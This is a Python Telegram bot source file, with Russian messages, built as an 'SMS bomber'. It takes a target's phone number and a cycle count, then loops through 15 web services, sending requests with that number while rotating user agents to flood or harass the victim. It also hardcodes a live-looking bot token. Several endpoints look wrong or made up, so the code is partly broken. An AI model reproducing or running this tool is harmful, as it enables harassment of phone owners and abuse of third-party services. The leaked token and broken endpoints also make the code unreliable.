import asyncio
import logging
import random
import time
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message

TOKEN = "8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE"

class SpamState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

bot = Bot(token=TOKEN)
dp = Dispatcher()

SERVICES = [
    {"name": "SMS-activate", "url": "https://sms-activate.org/stubs/handler_api.php", "method": "get", "params": {"action": "getNumber", "service": "tg", "country": 0}},
    {"name": "Onlinesim", "url": "https://onlinesim.io/api/getNum.php", "method": "get", "params": {"service": "tg", "country": "ru"}},
    {"name": "5sim", "url": "https://5sim.net/v1/user/buy/activation", "method": "get", "params": {"country": "ru", "operator": "any", "product": "telegram"}},
    {"name": "SMSPool", "url": "https://smspool.net/api/request.php", "method": "post", "data": {"action": "purchase", "service": "telegram"}},
    {"name": "SMSBower", "url": "https://smsbower.com/api/request", "method": "post", "data": {"service": "telegram"}},
    {"name": "TextVerified", "url": "https://textverified.com/api/v1/numbers", "method": "post", "data": {"service": "telegram"}},
    {"name": "SMSCodes", "url": "https://smscodes.io/api/request", "method": "post", "data": {"service": "telegram"}},
    {"name": "NumberHub", "url": "https://numberhub.com/api/request", "method": "post", "data": {"service": "telegram"}},
    {"name": "SMSReceive", "url": "https://smsreceive.com/api/request", "method": "post", "data": {"service": "telegram"}},
    {"name": "TempNumber", "url": "https://tempnumber.com/api/request", "method": "post", "data": {"service": "telegram"}},
    {"name": "SMSOnline", "url": "https://smsonline.com/api/request", "method": "post", "data": {"service": "telegram"}},
    {"name": "SMSVerification", "url": "https://smsverification.com/api/request", "method": "post", "data": {"service": "telegram"}},
    {"name": "SMSActivation", "url": "https://smsactivation.com/api/request", "method": "post", "data": {"service": "telegram"}},
    {"name": "SMSVerify", "url": "https://smsverify.com/api/request", "method": "post", "data": {"service": "telegram"}},
    {"name": "SMSNumber", "url": "https://smsnumber.com/api/request", "method": "post", "data": {"service": "telegram"}}
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

def send_request(service, phone):
    session = requests.Session()
    session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    try:
        if service["method"] == "get":
            params = service.get("params", {})
            params["phone"] = phone
            resp = session.get(service["url"], params=params, timeout=10)
        else:
            data = service.get("data", {})
            data["phone"] = phone
            resp = session.post(service["url"], json=data, timeout=10)
        return resp.status_code
    except:
        return 0

@dp.message(Command("start"))
async def start_cmd(message: Message):
    await message.answer("Отправь /spam")

@dp.message(Command("spam"))
async def spam_cmd(message: Message, state: FSMContext):
    await state.set_state(SpamState.waiting_phone)
    await message.answer("Введи номер (+77771234567)")

@dp.message(SpamState.waiting_phone)
async def phone_received(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith('+') or len(phone) < 10:
        await message.answer("Некорректный номер")
        return
    await state.update_data(phone=phone)
    await state.set_state(SpamState.waiting_count)
    await message.answer("Количество циклов (число)")

@dp.message(SpamState.waiting_count)
async def count_received(message: Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count <= 0:
            await message.answer("Положительное число")
            return
    except ValueError:
        await message.answer("Введи число")
        return
    data = await state.get_data()
    phone = data.get("phone")
    await state.clear()
    await message.answer(f"Начинаю спам на {phone} - {count} циклов по 15 сервисов я гей")
    asyncio.create_task(spam_worker(message, phone, count))

async def spam_worker(message: Message, phone: str, count: int):
    total = 0
    for cycle in range(count):
        for service in SERVICES:
            status = send_request(service, phone)
            total += 1
            if status == 200 or status == 201:
                await message.answer(f"[{cycle+1}/{count}] {service['name']} -> OK (200)")
            else:
                await message.answer(f"[{cycle+1}/{count}] {service['name']} -> {status}")
            await asyncio.sleep(random.randint(2, 5))
        await message.answer(f"Цикл {cycle+1}/{count} завершён. Пауза 10 сек.")
        await asyncio.sleep(10)
    await message.answer(f"Готово. Отправлено {total} запросов.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    dp.run_polling(bot)
